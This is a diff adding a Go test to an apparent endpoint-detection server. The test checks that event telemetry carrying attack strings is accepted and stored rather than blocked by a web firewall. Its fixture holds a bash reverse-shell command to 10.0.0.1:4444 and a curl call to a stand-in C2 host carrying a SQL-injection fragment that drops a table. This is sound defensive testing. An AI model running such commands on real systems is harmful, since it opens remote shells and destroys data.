@@ -377,6 +377,42 @@ func TestIngest_PersistsEvents(t *testing.T) {
 	assert.Equal(t, int64(1), hosts[0].EventCount)
 }
 
+// TestIngest_AttackSignatureTelemetryReachesServer drives an end-to-end POST /api/events whose payloads carry the strings a
+// content-inspecting WAF blocks on (a reverse-shell command line and a C2 URL with a SQL-injection fragment). Through the
+// default getting-started edge (a plain reverse proxy with no managed ruleset, mirrored here by the bare httptest server in
+// front of the real ingest handler) the request reaches the server and is accepted and persisted, not blocked. This is the
+// supported-topology guarantee behind docs/quickstart-vm.md: the managed-PaaS 403 the agent hit in production is an edge
+// artifact, never the server's behavior.
+//
+// spec:server-availability/the-default-getting-started-deployment-controls-its-own-edge/agent-telemetry-carrying-attack-signatures-reaches-the-server
+func TestIngest_AttackSignatureTelemetryReachesServer(t *testing.T) {
+	t.Parallel()
+	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
+	ctx := t.Context()
+
+	srv := httptest.NewServer(withHostID(d.Service().IngestHandler(), "host-a"))
+	t.Cleanup(srv.Close)
+
+	body := `[` +
+		`{"event_id":"e1","host_id":"host-a","timestamp_ns":1000,"event_type":"exec",` +
+		`"payload":{"path":"/bin/bash","args":["bash","-c","bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"]}},` +
+		`{"event_id":"e2","host_id":"host-a","timestamp_ns":1001,"event_type":"exec",` +
+		`"payload":{"path":"/usr/bin/curl","args":["curl","http://evil.example/c2?q=1' OR '1'='1; DROP TABLE users;--"]}}` +
+		`]`
+	req, err := http.NewRequestWithContext(ctx, http.MethodPost, srv.URL, strings.NewReader(body))
+	require.NoError(t, err)
+	req.Header.Set("Content-Type", "application/json")
+	resp, err := srv.Client().Do(req)
+	require.NoError(t, err)
+	defer resp.Body.Close()
+	require.Equal(t, http.StatusOK, resp.StatusCode, "attack-signature telemetry must be accepted, never content-blocked")
+
+	hosts, err := d.Service().ListHosts(ctx)
+	require.NoError(t, err)
+	require.Len(t, hosts, 1)
+	assert.Equal(t, int64(2), hosts[0].EventCount, "both attack-signature events must persist")
+}
+
 // spec:server-event-ingestion/host-identity-pinning/a-batch-contains-a-foreign-host-id
 func TestIngest_HostIDMismatchRejected(t *testing.T) {
 	t.Parallel()
